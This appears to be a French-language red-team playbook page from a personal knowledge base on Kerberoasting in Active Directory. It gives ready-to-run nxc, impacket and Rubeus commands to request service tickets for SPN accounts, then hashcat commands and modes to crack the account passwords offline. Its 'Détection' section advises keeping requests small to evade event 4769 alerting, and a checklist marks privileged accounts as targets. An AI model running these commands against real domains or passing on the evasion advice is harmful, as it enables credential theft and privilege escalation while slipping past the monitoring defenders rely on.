---
type: technique
status: ready
domain: active-directory
tags: [red-team, ad/kerberos, attack/T1558.003]
last_verified: 2026-10-30
---

# Kerberoasting

Tout utilisateur du domaine peut demander un ticket de service pour un compte doté d'un
SPN. Le ticket est chiffré avec la clé dérivée du mot de passe du compte : il se casse
hors ligne. Voir aussi [[Accueil]] et [[AS-REP roasting]].

## Énumération

```bash
nxc ldap $DC -u $USER -p '$PASS' --kerberoasting kerberoast.txt
impacket-GetUserSPNs $DOMAIN/$USER:'$PASS' -dc-ip $DC -request -outputfile kerberoast.txt
```

Depuis une session Windows :

```powershell
.\Rubeus.exe kerberoast /nowrap /outfile:kerberoast.txt
```

## Cassage

```bash
hashcat -m 13100 kerberoast.txt $WORDLIST -r /usr/share/hashcat/rules/best64.rule
```

| Type de chiffrement | Mode hashcat |
|---|---:|
| RC4 (etype 23) | 13100 |
| AES128 (etype 17) | 19600 |
| AES256 (etype 18) | 19700 |

## Détection

> [!warning] Bruit
> Une demande massive de tickets RC4 déclenche l'événement 4769 avec le type de
> chiffrement `0x17`. Cibler un compte à la fois.

- [ ] Vérifier la politique de mot de passe avant de casser
- [x] Noter les comptes à privilèges visés

![[capture-exemple.png]]
